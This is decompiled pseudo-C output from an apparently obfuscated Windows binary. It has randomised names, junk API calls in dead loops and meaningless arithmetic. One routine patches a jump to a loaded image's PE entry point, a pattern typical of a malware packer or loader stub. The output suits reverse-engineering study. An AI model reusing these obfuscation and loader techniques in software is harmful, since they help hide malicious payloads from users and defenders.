/* This file was generated by the Hex-Rays decompiler.
   Copyright (c) 2007-2020 Hex-Rays <info@hex-rays.com>

   Detected compiler: Visual C++
*/

#include <windows.h>
#include <defs.h>


//-------------------------------------------------------------------------
// Function declarations

// HPROPSHEETPAGE __stdcall CreatePropertySheetPageA(LPCPROPSHEETPAGEA constPropSheetPagePointer);
// HWND __stdcall CreateStatusWindowW(LONG style, LPCWSTR lpszText, HWND hwndParent, UINT wID);
// INT_PTR __stdcall PropertySheetA(LPCPROPSHEETHEADERA);
// int __stdcall ImageList_AddMasked(HIMAGELIST himl, HBITMAP hbmImage, COLORREF crMask);
// DWORD __stdcall GetCurrentThreadId();
// DWORD __stdcall FormatMessageA(DWORD dwFlags, LPCVOID lpSource, DWORD dwMessageId, DWORD dwLanguageId, LPSTR lpBuffer, DWORD nSize, va_list *Arguments);
// DWORD __stdcall GetCurrentProcessId();
// HANDLE __stdcall CreateWaitableTimerW(LPSECURITY_ATTRIBUTES lpTimerAttributes, BOOL bManualReset, LPCWSTR lpTimerName);
// LONG __stdcall InterlockedExchangeAdd(volatile LONG *Addend, LONG Value);
// BOOL __stdcall GetComputerNameW(LPWSTR lpBuffer, LPDWORD nSize);
// void __stdcall __noreturn ExitProcess(UINT uExitCode);
// BOOL __stdcall TerminateThread(HANDLE hThread, DWORD dwExitCode);
// BOOL __stdcall LockFile(HANDLE hFile, DWORD dwFileOffsetLow, DWORD dwFileOffsetHigh, DWORD nNumberOfBytesToLockLow, DWORD nNumberOfBytesToLockHigh);
// BOOL __stdcall SetLocalTime(const SYSTEMTIME *lpSystemTime);
// BOOL __stdcall TransactNamedPipe(HANDLE hNamedPipe, LPVOID lpInBuffer, DWORD nInBufferSize, LPVOID lpOutBuffer, DWORD nOutBufferSize, LPDWORD lpBytesRead, LPOVERLAPPED lpOverlapped);
// LONG __stdcall InterlockedExchange(volatile LONG *Target, LONG Value);
// int __cdecl stricmp(const char *String1, const char *String2);
// int __stdcall SetDIBits(HDC hdc, HBITMAP hbm, UINT start, UINT cLines, const void *lpBits, const BITMAPINFO *lpbmi, UINT ColorUse);
// int __stdcall GetClipBox(HDC hdc, LPRECT lprect);
// HBRUSH __stdcall CreateHatchBrush(int iHatch, COLORREF color);
// HPALETTE __stdcall CreateHalftonePalette(HDC hdc);
// HDC __stdcall CreateDCW(LPCWSTR pwszDriver, LPCWSTR pwszDevice, LPCWSTR pszPort, const DEVMODEW *pdm);
// BOOL __stdcall RestoreDC(HDC hdc, int nSavedDC);
// BOOL __stdcall PathMakePrettyW(LPWSTR pszPath);
// int __stdcall StrSpnA(PCSTR psz, PCSTR pszSet);
// BOOL __stdcall SystemParametersInfoW(UINT uiAction, UINT uiParam, PVOID pvParam, UINT fWinIni);
// BOOL __stdcall DestroyCaret();
// int __stdcall SetWindowRgn(HWND hWnd, HRGN hRgn, BOOL bRedraw);
// LRESULT __stdcall DefWindowProcA(HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam);
// BOOL __stdcall DestroyCursor(HCURSOR hCursor);
// BOOL __stdcall SetScrollRange(HWND hWnd, int nBar, int nMinPos, int nMaxPos, BOOL bRedraw);
// INT_PTR __stdcall DialogBoxIndirectParamA(HINSTANCE hInstance, LPCDLGTEMPLATEA hDialogTemplate, HWND hWndParent, DLGPROC lpDialogFunc, LPARAM dwInitParam);
// LRESULT __stdcall SendDlgItemMessageA(HWND hDlg, int nIDDlgItem, UINT Msg, WPARAM wParam, LPARAM lParam);
// LRESULT __stdcall SendMessageA(HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam);
// LPARAM __stdcall GetMessageExtraInfo();
// BOOL __stdcall SetMenuDefaultItem(HMENU hMenu, UINT uItem, UINT fByPos);
// BOOL __stdcall SetMenuItemBitmaps(HMENU hMenu, UINT uPosition, UINT uFlags, HBITMAP hBitmapUnchecked, HBITMAP hBitmapChecked);
// int __stdcall ShowCursor(BOOL bShow);
// BOOL __stdcall IsMenu(HMENU hMenu);
// unsigned int *__userpurge sub_4038B4@<eax>(unsigned int *_EAX@<eax>, unsigned int ebx0@<ebx>, unsigned int a1, float a2);
// unsigned int *__userpurge HKrXZROZ_Mf_noYJLG@<eax>(unsigned int *result@<eax>, unsigned int a2@<ebx>, unsigned int a3, float a4);
// void __userpurge _riGFEGY_WGXY_qbsOD_(unsigned int a1@<edi>, char a2);
void __stdcall JVPFYysga_h(int a1, float *a2);
void __stdcall Q_B_GTvmg_bvsmX(unsigned int a1);
int __stdcall sub_4039CA(int a1, int a2, int a3);
int __fastcall sub_4039FA(int a1, int a2, int a3, _DWORD *a4);
int __stdcall sub_403C31(int a1, int a2, int a3);
// int __usercall sub_403E03@<eax>(_DWORD *a1@<eax>);
// LONG __usercall sub_403E27@<eax>(int a1@<ebp>, unsigned int a2@<edi>, LONG *a3@<esi>);
int sub_403EEE();
int sub_404004();
int sub_40419E();
int __stdcall sub_404365(int a1, unsigned int a2);
int sub_4047C6();
int sub_404AB9();
// int __usercall sub_404C90@<eax>(int a1@<ebp>, unsigned int a2@<edi>, unsigned int *a3@<esi>);
int sub_404D4D();
int __fastcall sub_404EEB(int a1, int a2);
int sub_405060();
unsigned int *__stdcall sub_405435(int a1, int a2, void (__stdcall *a3)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD), int a4);
// int __userpurge sub_4055DB@<eax>(char a1@<al>, unsigned __int8 a2);
// int __usercall sub_40564B@<eax>(int a1@<eax>, unsigned int a2@<ebx>, unsigned int a3@<edi>);
int __stdcall start(int a1);
int sub_405F2F();
// void *__cdecl memset(void *, int Val, size_t Size);
HBITMAP __fastcall sub_4060BA(unsigned int a1, int a2, int a3, int a4, _DWORD *a5);
int __cdecl sub_40672B(char *a1, int a2, int a3, int a4);
// int __userpurge sub_406CEC@<eax>(__int16 a1@<ax>, unsigned __int16 a2);
void __fastcall __he_qt(unsigned int a1, int a2, unsigned int a3);
// void __userpurge RF_Egdnkvdiiuncf(unsigned int a1@<edi>, unsigned int a2, __int16 *a3);
void __stdcall kJAZuY_hvjqel_v_wuvzz(unsigned int a1, unsigned __int16 a2);
void __stdcall xcfq_xwotK(unsigned int *a1);

//-------------------------------------------------------------------------
// Data declarations

void ***off_40A040 = &off_40A03C; // weak
void ***off_40A058 = &off_40A054; // weak
int (**off_40A080)[484] = &off_40A068; // weak
int (__stdcall **off_40A084)(int, int) = &off_40A074; // weak
int dword_40A090 = 0; // weak
int dword_40A094 = -8239; // weak
int dword_40A098 = -12351; // weak
int dword_40A09C = 15921; // weak
int dword_40A0A0 = 11809; // weak
int *off_40A0D4[4] = { &dword_40A094, &dword_40A098, &dword_40A09C, &dword_40A0A0 }; // weak
int dword_40A0EC = 0; // weak
_DWORD dword_40A0F0 = 0; // idb
_DWORD dword_40A0F4 = 0; // idb
int dword_40A100 = 0; // weak
int dword_40A104 = 0; // weak
void *off_40A11C = &unk_40A108; // weak
_UNKNOWN unk_40A1A4; // weak
int **off_40A2D8 = &off_40A110; // weak
LONG Addend = 126223991; // idb
_DWORD dword_40A2F0 = 88433785; // idb
_DWORD dword_40A2F4 = 88561514; // idb
int dword_40A2F8 = 0; // weak
char *off_40A2FC = &byte_40184B; // weak
int dword_40A300 = 106390553; // weak
int dword_40A304 = 106193944; // weak
int dword_40A308 = 6624275; // weak
int dword_40A30C = 15080055; // weak
int (__stdcall *off_40A310)(_DWORD, _DWORD, _DWORD) = &sub_4039CA; // weak
int dword_40A314 = 489222; // weak
int dword_40A318 = 108336902; // weak
int dword_40A31C = 395014; // weak
int dword_40A320 = 124082039; // weak
__int16 word_40A340[] = { -31227 }; // weak
int dword_40A49C = -4117; // weak
int dword_40A4B8 = 3417365; // weak
__int16 word_40A4BC = -314; // weak
__int16 word_40A4C4 = 24696; // weak
int dword_40A4CC = 488820; // weak
int dword_40A4D0 = 489319; // weak
_UNKNOWN unk_40A4D4; // weak
char byte_40A4D7[] = { '\b' }; // weak
int dword_40A4D8 = 271384; // weak
int dword_40A4EC = 0; // weak
_UNKNOWN unk_40A4F0; // weak
int dword_40A514 = 0; // weak
char aZZsE[10] = "Z!\" ZS\\E®"; // weak
char String2[] = "KJDjkkIDiuoif"; // idb
char String1[] = "JUDkjkKDK"; // idb
char aVx[4] = "\bvx"; // weak
int dword_40A54C = 3478978; // weak
int dword_40A550 = 144131946; // weak
int dword_40A554 = 1988494374; // weak
CHAR pszSet[3] = "ks"; // idb
CHAR psz[] = "sdjlksd"; // idb
int (__cdecl *off_40A580)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD) = &sub_40672B; // weak
_DWORD off_40A584 = 4219066; // idb
_UNKNOWN unk_40A638; // weak
_BYTE byte_40A640[336] =
{
  0,
  0,
  0,
  0,
  113,
  51,
  74,
  110,
  112,
  114,
  33,
  121,
  32,
  121,
  32,
  110,
  77,
  83,
  97,
  51,
  45,
  82,
  49,
  97,
  100,
  53,
  51,
  49,
  32,
  81,
  46,
  76,
  115,
  99,
  32,
  73,
  113,
  111,
  0,
  32,
  80,
  65,
  32,
  50,
  32,
  80,
  76,
  57,
  54,
  99,
  122,
  71,
  105,
  104,
  44,
  119,
  73,
  54,
  32,
  111,
  109,
  117,
  51,
  45,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  76,
  56,
  0,
  121,
  113,
  67,
  109,
  84,
  97,
  51,
  89,
  120,
  74,
  80,
  57,
  54,
  33,
  119,
  118,
  52,
  32,
  49,
  49,
  0,
  32,
  107,
  106,
  0,
  108,
  77,
  111,
  32,
  33,
  104,
  111,
  119,
  51,
  117,
  52,
  84,
  0,
  109,
  56,
  83,
  122,
  46,
  48,
  56,
  122,
  0,
  74,
  99,
  0,
  117,
  121,
  56,
  69,
  86,
  0,
  0,
  32,
  53,
  100,
  109,
  32,
  109,
  32,
  78,
  108,
  0,
  115,
  32,
  56,
  85,
  55,
  118,
  76,
  32,
  32,
  54,
  100,
  105,
  48,
  50,
  104,
  120,
  73,
  0,
  69,
  51,
  49,
  79,
  46,
  52,
  82,
  95,
  52,
  0,
  55,
  0,
  51,
  110,
  118,
  107,
  48,
  50,
  86,
  87,
  107,
  0,
  97,
  87,
  52,
  107,
  32,
  76,
  55,
  97,
  87,
  45,
  115,
  113,
  54,
  0,
  97,
  51,
  95,
  67,
  106,
  50,
  116,
  118,
  110,
  71,
  0,
  0,
  95,
  54,
  44,
  111,
  80,
  51,
  109,
  98,
  67,
  0,
  97,
  55,
  71,
  107,
  32,
  55,
  114,
  51,
  53,
  82,
  113,
  112,
  105,
  55,
  54,
  56,
  53,
  95,
  99,
  95,
  120,
  68,
  108,
  33,
  0,
  0,
  109,
  51,
  112,
  81,
  115,
  112,
  32,
  53,
  57,
  32,
  84,
  120,
  118,
  50,
  108,
  106,
  74,
  0,
  74,
  32,
  0,
  0,
  73,
  109,
  108,
  95,
  122,
  98,
  121,
  32,
  89,
  55,
  53,
  32,
  48,
  119,
  32,
  55,
  57,
  55,
  53,
  114,
  101,
  0,
  107,
  32,
  55,
  110,
  45,
  81,
  104,
  83,
  89,
  53,
  56,
  70,
  0,
  0,
  55,
  70,
  55,
  46,
  0,
  49,
  32,
  51,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0
}; // idb
int dword_40AAEE = 1062730; // weak
int dword_40AAF2 = 1061459; // weak
struct tagRECT stru_40AAF6 = { 1064747, 1067575, 1069578, 1066658 }; // idb
int dword_40AB06 = 1077205; // weak
int dword_40AB0A = 1056181; // weak
int dword_40AB0E = 1055834; // weak
int dword_40AB12 = 1063310; // weak
int dword_40AB16 = 1065140; // weak
int dword_40AB1A = 1069167; // weak
int dword_40AB1E = 1060202; // weak
int dword_40AB22 = 1064670; // weak
int dword_40AB26 = 1075845; // weak
int dword_40AB2A = 1080315; // weak
int dword_40AB2E = 1060110; // weak
int dword_40AB32 = 1065317; // weak
int dword_40AB36 = 1066463; // weak
CHAR dword_40AB3A[] = { 'a', '\v', '\x10', '\0' }; // idb
int dword_40AB3E = 1063859; // weak
int dword_40AB42 = 1080101; // weak
int dword_40AB46 = 1053383; // weak
int dword_40AB4A = 1061994; // weak
int dword_40AB4E = 1054360; // weak
int dword_40AB52 = 1071291; // weak
struct tagRECT rect = { 1072768, 1054235, 1068091, 1059831 }; // idb
DWORD BytesRead = 1080224u; // idb
int dword_40AB6A = 1056892; // weak
int dword_40AB6E = 1053969; // weak
int dword_40AB72 = 1077706; // weak
int dword_40AB76 = 1065065; // weak
int dword_40AB7A = 1059230; // weak
int dword_40AB7E = 1057913; // weak
int dword_40AB82 = 1060709; // weak
int dword_40AB86 = 1081173; // weak
int dword_40AB8A = 1070043; // weak
int dword_40AB8E = 1050099; // weak
int dword_40AB92 = 1059487; // weak
int dword_40AB96 = 1076723; // weak
int dword_40AB9A = 1059168; // weak
int dword_40AB9E = 1071757; // weak
int dword_40ABA2 = 1048983; // weak
CHAR Buffer[] = { 'ò', 'm', '\x10', '\0' }; // idb
WCHAR word_40ABAA = 4329u; // idb
int dword_40ABAE = 1051295; // weak
int dword_40ABB2 = 1074587; // weak
int dword_40ABB6 = 1076347; // weak
int dword_40ABBA = 1081292; // weak
int dword_40ABBE = 1064888; // weak
int dword_40ABC2 = 1080649; // weak
int dword_40ABC6 = 1067973; // weak
char byte_40ABCA = '9'; // weak
int dword_40ABCE = 1063640; // weak
int dword_40ABD2 = 1061364; // weak
int dword_40ABD6 = 1051363; // weak
int dword_40ABDA = 1067712; // weak
int dword_40ABDE = 1071840; // weak
int dword_40ABE2 = 1076298; // weak
int dword_40ABE6 = 1056736; // weak
int dword_40ABEA = 1050131; // weak
int *off_40AC6A[2] = { &dword_40AAEE, &dword_40AAF2 }; // weak
int *off_40AC6E = &dword_40AAF2; // weak
void *off_40AC7A = (void *)0x40AAFE; // weak
int *off_40AC82[20] =
{
  &dword_40AB06,
  &dword_40AB0A,
  &dword_40AB0E,
  &dword_40AB12,
  &dword_40AB16,
  &dword_40AB1A,
  &dword_40AB1E,
  &dword_40AB22,
  &dword_40AB26,
  &dword_40AB2A,
  &dword_40AB2E,
  &dword_40AB32,
  &dword_40AB36,
  &dword_40AB3A,
  &dword_40AB3E,
  &dword_40AB42,
  &dword_40AB46,
  &dword_40AB4A,
  &dword_40AB4E,
  &dword_40AB52
}; // weak
int *off_40AC8E[17] =
{
  &dword_40AB12,
  &dword_40AB16,
  &dword_40AB1A,
  &dword_40AB1E,
  &dword_40AB22,
  &dword_40AB26,
  &dword_40AB2A,
  &dword_40AB2E,
  &dword_40AB32,
  &dword_40AB36,
  &dword_40AB3A,
  &dword_40AB3E,
  &dword_40AB42,
  &dword_40AB46,
  &dword_40AB4A,
  &dword_40AB4E,
  &dword_40AB52
}; // weak
int *off_40AC92[16] =
{
  &dword_40AB16,
  &dword_40AB1A,
  &dword_40AB1E,
  &dword_40AB22,
  &dword_40AB26,
  &dword_40AB2A,
  &dword_40AB2E,
  &dword_40AB32,
  &dword_40AB36,
  &dword_40AB3A,
  &dword_40AB3E,
  &dword_40AB42,
  &dword_40AB46,
  &dword_40AB4A,
  &dword_40AB4E,
  &dword_40AB52
}; // weak
int *off_40AC9A[14] =
{
  &dword_40AB1E,
  &dword_40AB22,
  &dword_40AB26,
  &dword_40AB2A,
  &dword_40AB2E,
  &dword_40AB32,
  &dword_40AB36,
  &dword_40AB3A,
  &dword_40AB3E,
  &dword_40AB42,
  &dword_40AB46,
  &dword_40AB4A,
  &dword_40AB4E,
  &dword_40AB52
}; // weak
int *off_40AC9E[13] =
{
  &dword_40AB22,
  &dword_40AB26,
  &dword_40AB2A,
  &dword_40AB2E,
  &dword_40AB32,
  &dword_40AB36,
  &dword_40AB3A,
  &dword_40AB3E,
  &dword_40AB42,
  &dword_40AB46,
  &dword_40AB4A,
  &dword_40AB4E,
  &dword_40AB52
}; // weak
int *off_40ACA2[12] =
{
  &dword_40AB26,
  &dword_40AB2A,
  &dword_40AB2E,
  &dword_40AB32,
  &dword_40AB36,
  &dword_40AB3A,
  &dword_40AB3E,
  &dword_40AB42,
  &dword_40AB46,
  &dword_40AB4A,
  &dword_40AB4E,
  &dword_40AB52
}; // weak
int *off_40ACA6[11] =
{
  &dword_40AB2A,
  &dword_40AB2E,
  &dword_40AB32,
  &dword_40AB36,
  &dword_40AB3A,
  &dword_40AB3E,
  &dword_40AB42,
  &dword_40AB46,
  &dword_40AB4A,
  &dword_40AB4E,
  &dword_40AB52
}; // weak
int *off_40ACAA[10] =
{
  &dword_40AB2E,
  &dword_40AB32,
  &dword_40AB36,
  &dword_40AB3A,
  &dword_40AB3E,
  &dword_40AB42,
  &dword_40AB46,
  &dword_40AB4A,
  &dword_40AB4E,
  &dword_40AB52
}; // weak
int *off_40ACBA[6] =
{
  &dword_40AB3E,
  &dword_40AB42,
  &dword_40AB46,
  &dword_40AB4A,
  &dword_40AB4E,
  &dword_40AB52
}; // weak
int *off_40ACC2[4] = { &dword_40AB46, &dword_40AB4A, &dword_40AB4E, &dword_40AB52 }; // weak
int *off_40ACCA[2] = { &dword_40AB4E, &dword_40AB52 }; // weak
void *off_40ACDA = (void *)0x40AB5E; // weak
int *off_40ACEA[15] =
{
  &dword_40AB6E,
  &dword_40AB72,
  &dword_40AB76,
  &dword_40AB7A,
  &dword_40AB7E,
  &dword_40AB82,
  &dword_40AB86,
  &dword_40AB8A,
  &dword_40AB8E,
  &dword_40AB92,
  &dword_40AB96,
  &dword_40AB9A,
  &dword_40AB9E,
  &dword_40ABA2,
  &Buffer
}; // weak
int *off_40ACF2[13] =
{
  &dword_40AB76,
  &dword_40AB7A,
  &dword_40AB7E,
  &dword_40AB82,
  &dword_40AB86,
  &dword_40AB8A,
  &dword_40AB8E,
  &dword_40AB92,
  &dword_40AB96,
  &dword_40AB9A,
  &dword_40AB9E,
  &dword_40ABA2,
  &Buffer
}; // weak
int *off_40ACFE[10] =
{
  &dword_40AB82,
  &dword_40AB86,
  &dword_40AB8A,
  &dword_40AB8E,
  &dword_40AB92,
  &dword_40AB96,
  &dword_40AB9A,
  &dword_40AB9E,
  &dword_40ABA2,
  &Buffer
}; // weak
int *off_40AD02[9] =
{
  &dword_40AB86,
  &dword_40AB8A,
  &dword_40AB8E,
  &dword_40AB92,
  &dword_40AB96,
  &dword_40AB9A,
  &dword_40AB9E,
  &dword_40ABA2,
  &Buffer
}; // weak
int *off_40AD06[8] =
{
  &dword_40AB8A,
  &dword_40AB8E,
  &dword_40AB92,
  &dword_40AB96,
  &dword_40AB9A,
  &dword_40AB9E,
  &dword_40ABA2,
  &Buffer
}; // weak
int *off_40AD0E[6] =
{
  &dword_40AB92,
  &dword_40AB96,
  &dword_40AB9A,
  &dword_40AB9E,
  &dword_40ABA2,
  &Buffer
}; // weak
int *off_40AD12[5] = { &dword_40AB96, &dword_40AB9A, &dword_40AB9E, &dword_40ABA2, &Buffer }; // weak
int *off_40AD16[4] = { &dword_40AB9A, &dword_40AB9E, &dword_40ABA2, &Buffer }; // weak
int *off_40AD1A[3] = { &dword_40AB9E, &dword_40ABA2, &Buffer }; // weak
int *off_40AD1E[2] = { &dword_40ABA2, &Buffer }; // weak
int *off_40AD22 = &Buffer; // weak
int *off_40AD32[5] = { &dword_40ABB6, &dword_40ABBA, &dword_40ABBE, &dword_40ABC2, &dword_40ABC6 }; // weak
int *off_40AD3E[2] = { &dword_40ABC2, &dword_40ABC6 }; // weak
int *off_40AD42 = &dword_40ABC6; // weak
int *off_40AD4A[8] =
{
  &dword_40ABCE,
  &dword_40ABD2,
  &dword_40ABD6,
  &dword_40ABDA,
  &dword_40ABDE,
  &dword_40ABE2,
  &dword_40ABE6,
  &dword_40ABEA
}; // weak
int *off_40AD4E[7] =
{
  &dword_40ABD2,
  &dword_40ABD6,
  &dword_40ABDA,
  &dword_40ABDE,
  &dword_40ABE2,
  &dword_40ABE6,
  &dword_40ABEA
}; // weak
int *off_40AD52[6] =
{
  &dword_40ABD6,
  &dword_40ABDA,
  &dword_40ABDE,
  &dword_40ABE2,
  &dword_40ABE6,
  &dword_40ABEA
}; // weak
int *off_40AD56[5] = { &dword_40ABDA, &dword_40ABDE, &dword_40ABE2, &dword_40ABE6, &dword_40ABEA }; // weak
int *off_40AD5E[3] = { &dword_40ABE2, &dword_40ABE6, &dword_40ABEA }; // weak
int *off_40AD62[2] = { &dword_40ABE6, &dword_40ABEA }; // weak
WCHAR pszPort = 67u; // idb
WCHAR pwszDevice[] = L"GF5_ETSTGW_FFRH_1RT_"; // idb
WCHAR aSbe40u8yEzii5n[] = L"SBE_40U8Y_EZII5N07_EZ"; // idb
WCHAR szText = 84u; // idb


//----- (004038B4) --------------------------------------------------------
unsigned int *__userpurge sub_4038B4@<eax>(unsigned int *_EAX@<eax>, unsigned int ebx0@<ebx>, unsigned int a1, float a2)
{
  __asm
  {
    das
    das
    das
    das
  }
  return HKrXZROZ_Mf_noYJLG(_EAX, ebx0, a1, a2);
}

//----- (004038B8) --------------------------------------------------------
unsigned int *__userpurge HKrXZROZ_Mf_noYJLG@<eax>(unsigned int *result@<eax>, unsigned int a2@<ebx>, unsigned int a3, float a4)
{
  int v4; // ecx

  dword_40AB76 += dword_40ABD6 + (dword_40AB16 < (unsigned int)result);
  v4 = dword_40AB76;
  *off_40AD02[0] |= dword_40ABA2;
  rect.left = (__PAIR64__(rect.left, a2) - __PAIR64__(*off_40AC6E, v4)) >> 32;
  return result;
}
// 40AB16: using guessed type int dword_40AB16;
// 40AB76: using guessed type int dword_40AB76;
// 40ABA2: using guessed type int dword_40ABA2;
// 40ABD6: using guessed type int dword_40ABD6;
// 40AC6E: using guessed type int *off_40AC6E;
// 40AD02: using guessed type int *off_40AD02[9];

//----- (00403900) --------------------------------------------------------
void __userpurge _riGFEGY_WGXY_qbsOD_(unsigned int a1@<edi>, char a2)
{
  dword_40AB9E += dword_40AB6E + (stru_40AAF6.left < a1);
  *off_40AD52[0] &= dword_40AB32;
  *off_40ACC2[0] -= dword_40AB6A;
}
// 40AB32: using guessed type int dword_40AB32;
// 40AB6A: using guessed type int dword_40AB6A;
// 40AB6E: using guessed type int dword_40AB6E;
// 40AB9E: using guessed type int dword_40AB9E;
// 40ACC2: using guessed type int *off_40ACC2[4];
// 40AD52: using guessed type int *off_40AD52[6];

//----- (00403940) --------------------------------------------------------
void __stdcall JVPFYysga_h(int a1, float *a2)
{
  dword_40AAF2 ^= *off_40AD32[0];
  dword_40ABBA = (unsigned __int8)(dword_40ABDA & dword_40ABBA);
  *(_DWORD *)off_40AC7A |= dword_40ABDE;
}
// 40AAF2: using guessed type int dword_40AAF2;
// 40ABBA: using guessed type int dword_40ABBA;
// 40ABDA: using guessed type int dword_40ABDA;
// 40ABDE: using guessed type int dword_40ABDE;
// 40AC7A: using guessed type void *off_40AC7A;
// 40AD32: using guessed type int *off_40AD32[5];

//----- (00403981) --------------------------------------------------------
void __stdcall Q_B_GTvmg_bvsmX(unsigned int a1)
{
  BytesRead += dword_40AB72;
  dword_40AB12 ^= *off_40AD02[0];
  dword_40AB46 = *off_40ACF2[0] & (unsigned __int8)dword_40AB46;
}
// 40AB12: using guessed type int dword_40AB12;
// 40AB46: using guessed type int dword_40AB46;
// 40AB72: using guessed type int dword_40AB72;
// 40ACF2: using guessed type int *off_40ACF2[13];
// 40AD02: using guessed type int *off_40AD02[9];

//----- (004039CA) --------------------------------------------------------
int __stdcall sub_4039CA(int a1, int a2, int a3)
{
  dword_40A094 = 7755624;
  dword_40A098 = 9986408;
  dword_40A09C = 4527143;
  dword_40A0A0 = 15230839;
  return 8865402;
}
// 40A094: using guessed type int dword_40A094;
// 40A098: using guessed type int dword_40A098;
// 40A09C: using guessed type int dword_40A09C;
// 40A0A0: using guessed type int dword_40A0A0;

//----- (004039FA) --------------------------------------------------------
int __fastcall sub_4039FA(int a1, int a2, int a3, _DWORD *a4)
{
  int v4; // ecx
  int *v5; // eax
  int v6; // eax
  int v7; // eax
  int v9; // [esp+20h] [ebp-38h]
  int hdc; // [esp+48h] [ebp-10h]

  for ( hdc = 27; hdc; --hdc )
  {
    if ( hdc == 29 )
      CreatePropertySheetPageA((LPCPROPSHEETPAGEA)0x5A73);
  }
  v4 = dword_40A0F0;
  *(_BYTE *)off_40AC6A[28] += 44;
  if ( v4 == 1 || !**(_DWORD **)(a3 + 56) )
  {
    v7 = -4127;
  }
  else
  {
    v5 = off_40A2D8[2];
    a2 = *v5;
    v6 = *v5 + *(_DWORD *)(*(_DWORD *)(*v5 + 60) + *v5 + 40);
    if ( off_40A2D8[16] )
    {
      *(_BYTE *)off_40A310 = -23;
      *(_DWORD *)((char *)off_40A310 + 1) = v6 + 9514 - (_DWORD)off_40A310 - 9519;
      *a4 = off_40A310(*off_40A2D8[2], dword_40A0F0, dword_40A0F4);
    }
    rect.left ^= v9;
    dword_40A100 = 0;
    dword_40AB0E = 0;
    do
    {
      if ( ++dword_40AB0E == 42 )
        SetDIBits(0, (HBITMAP)0x84A6, 0x2454u, 0x75A5u, (const void *)0x72870000, (const BITMAPINFO *)0x3A69, 0x2920u);
    }
    while ( (unsigned int)dword_40AB0E < 0x1C );
    dword_40A104 = 0;
    v7 = -4126;
  }
  dword_40AB72 = (__PAIR64__(dword_40AB72, a2) - __PAIR64__(&dword_40ABA2, stru_40AAF6.left)) >> 32;
  dword_40AB72 ^= (unsigned int)&dword_40AB12;
  return (v7 ^ 0x3530) + 9519;
}
// 403B6F: variable 'v9' is possibly undefined
// 403C13: variable 'a2' is possibly undefined
// 40A0F0: using guessed type int dword_40A0F0;
// 40A0F4: using guessed type int dword_40A0F4;
// 40A100: using guessed type int dword_40A100;
// 40A104: using guessed type int dword_40A104;
// 40A2D8: using guessed type int **off_40A2D8;
// 40A310: using guessed type int (__stdcall *off_40A310)(_DWORD, _DWORD, _DWORD);
// 40AB0E: using guessed type int dword_40AB0E;
// 40AB12: using guessed type int dword_40AB12;
// 40AB72: using guessed type int dword_40AB72;
// 40ABA2: using guessed type int dword_40ABA2;
// 40AC6A: using guessed type int *off_40AC6A[2];
// 40ACC2: using guessed type int *off_40ACC2[4];
// 40ACEA: using guessed type int *off_40ACEA[15];

//----- (00403C31) --------------------------------------------------------
int __stdcall sub_403C31(int a1, int a2, int a3)
{
  int result; // eax
  int *v4; // edx
  int v5; // edi
  int *v6; // edx
  int *v7; // edx
  int *v8; // edx
  PVOID pvParam; // [esp+34h] [ebp-28h]
  int v10; // [esp+38h] [ebp-24h]

  result = -4127;
  for ( dword_40AB42 = 22; dword_40AB42; --dword_40AB42 )
  {
    if ( dword_40AB42 == 38 )
      result = SystemParametersInfoW(0x5AECu, 0x189Cu, pvParam, 0x76ABu);
  }
  do
  {
    v10 ^= *off_40AD0E[0];
    v4 = off_40A0D4[((_BYTE)result + 1) & 3];
    v5 = -8220 * result * *v4;
    dword_40ABBA += (int)&dword_40AB0E;
    dword_40ABBA ^= (unsigned int)&dword_40AB26;
    dword_40ABBA += (int)&stru_40AAF6.top;
    *v4 = v5;
    dword_40ABA2 &= (unsigned int)&rect.right;
    dword_40ABA2 += (int)&dword_40AB96;
    dword_40ABA2 += (int)&dword_40AB22;
    v6 = off_40A0D4[((_BYTE)result - 1) & 3];
    *v6 ^= result | (-8221 * result);
    dword_40A304 = a1;
    if ( result == -4575 )
    {
      dword_40A308 = a2;
    }
    else if ( result == -4511 )
    {
      dword_40A30C = a3;
    }
    rect.left += 8818;
    result = ((result ^ 0x3530) - 9518 + 9519) ^ 0x3530;
    v7 = off_40A0D4[result & 3];
    *v7 += result ^ (-8222 * result);
    v8 = off_40A0D4[((_BYTE)result - 2) & 3];
    *v8 |= -8219 * result;
  }
  while ( result != -4399 );
  return result;
}
// 403C73: variable 'pvParam' is possibly undefined
// 403CDF: variable 'v10' is possibly undefined
// 40A0D4: using guessed type int *off_40A0D4[4];
// 40A304: using guessed type int dword_40A304;
// 40A308: using guessed type int dword_40A308;
// 40A30C: using guessed type int dword_40A30C;
// 40AB0E: using guessed type int dword_40AB0E;
// 40AB22: using guessed type int dword_40AB22;
// 40AB26: using guessed type int dword_40AB26;
// 40AB42: using guessed type int dword_40AB42;
// 40AB96: using guessed type int dword_40AB96;
// 40ABA2: using guessed type int dword_40ABA2;
// 40ABBA: using guessed type int dword_40ABBA;
// 40AD0E: using guessed type int *off_40AD0E[6];

//----- (00403E03) --------------------------------------------------------
int __usercall sub_403E03@<eax>(_DWORD *a1@<eax>)
{
  int result; // eax

  dword_40A554 = (int)(a1 + 1);
  *(_DWORD *)aVx = a1[2];
  dword_40A54C = a1[3];
  result = a1[4];
  dword_40A550 = result;
  return result;
}
// 40A54C: using guessed type int dword_40A54C;
// 40A550: using guessed type int dword_40A550;
// 40A554: using guessed type int dword_40A554;

//----- (00403E27) --------------------------------------------------------
LONG __usercall sub_403E27@<eax>(int a1@<ebp>, unsigned int a2@<edi>, LONG *a3@<esi>)
{
  LONG result; // eax
  LONG v4; // ecx

  *a3 = 1;
  result = InterlockedExchange(&Addend, 7734903);
  while ( *a3 != a2 )
  {
    v4 = *a3;
    if ( *a3 >= a2 )
    {
      if ( v4 )
      {
        *a3 = v4 - 1;
        continue;
      }
    }
    else if ( v4 )
    {
      dword_40AB22 = 0;
      do
      {
        if ( ++dword_40AB22 == 36 )
          CreateStatusWindowW(17752, &szText, (HWND)0x1AE8, *(_DWORD *)(a1 - 12));
      }
      while ( (unsigned int)dword_40AB22 < 0x1E );
      result = a2 / 0x101 + v4 + 1;
      *a3 = result;
      continue;
    }
    *a3 = a2;
  }
  return result;
}
// 403EC7: variable 'v4' is possibly undefined
// 40AB22: using guessed type int dword_40AB22;

